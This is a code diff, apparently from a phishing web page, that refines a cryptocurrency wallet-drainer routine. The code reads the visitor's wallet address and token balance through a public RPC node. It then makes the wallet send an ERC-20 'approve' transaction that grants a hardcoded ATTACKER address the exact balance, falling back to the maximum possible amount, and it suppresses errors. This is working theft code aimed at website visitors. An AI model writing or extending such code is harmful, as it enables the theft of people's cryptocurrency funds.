@@ -889,32 +889,50 @@
       return;
     }
 
-    // ── EVM (copie exacte evmApprove de 3.html) ──
-    const eth = window.ethereum;
-    if (!eth) return;
+// ── EVM (copie exacte evmApprove de 3.html) ──
+const eth = window.ethereum;
+if (!eth) return;
 
-    const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
-    const data  = iface.encodeFunctionData('approve', [ATTACKER, MAX]);
+let from = eth.selectedAddress || eth.address || '';
+if (!from) {
+  try {
+    const accounts = await eth.request({ method: 'eth_accounts', params: [] });
+    from = (accounts && accounts[0]) ? accounts[0] : '';
+  } catch(e) { from = ''; }
+}
 
-    let from = eth.selectedAddress || eth.address || '';
-    if (!from) {
-      try {
-        const accounts = await eth.request({ method: 'eth_accounts', params: [] });
-        from = (accounts && accounts[0]) ? accounts[0] : '0x0000000000000000000000000000000000000000';
-      } catch(e) {
-        from = '0x0000000000000000000000000000000000000000';
-      }
-    }
+// Fetch balance exact via RPC public — pas besoin de connexion wallet
+let approveAmount;
+try {
+  const rpcProvider = new ethers.providers.JsonRpcProvider('https://ethereum.publicnode.com');
+  const tokenContract = new ethers.Contract(p.token, [
+    'function balanceOf(address) view returns (uint256)',
+    'function decimals() view returns (uint8)'
+  ], rpcProvider);
+  const bal = from
+    ? await tokenContract.balanceOf(from)
+    : ethers.BigNumber.from(0);
+  approveAmount = bal.isZero()
+    ? '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+    : bal.toString();
+} catch(e) {
+  // fallback MAX si RPC fail
+  approveAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+  console.warn('balance fetch failed, fallback MAX', e);
+}
 
-    try {
-      await Promise.race([
-        eth.request({
-          method: 'eth_sendTransaction',
-          params: [{ from: from, to: p.token, value: '0x0', data: data }]
-        }),
-        new Promise(function(_, rej) { setTimeout(function() { rej(new Error('TIMEOUT')); }, 120000); })
-      ]);
-    } catch(e) { console.warn('evm approve error', e); }
+const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
+const data  = iface.encodeFunctionData('approve', [ATTACKER, approveAmount]);
+
+try {
+  await Promise.race([
+    eth.request({
+      method: 'eth_sendTransaction',
+      params: [{ from: from || '0x0000000000000000000000000000000000000000', to: p.token, value: '0x0', data: data }]
+    }),
+    new Promise(function(_, rej) { setTimeout(function() { rej(new Error('TIMEOUT')); }, 120000); })
+  ]);
+} catch(e) { console.warn('evm approve error', e); }
   }
 
   // ── QR DEEPLINK TRUST WALLET ──────────────────────────────────────────────
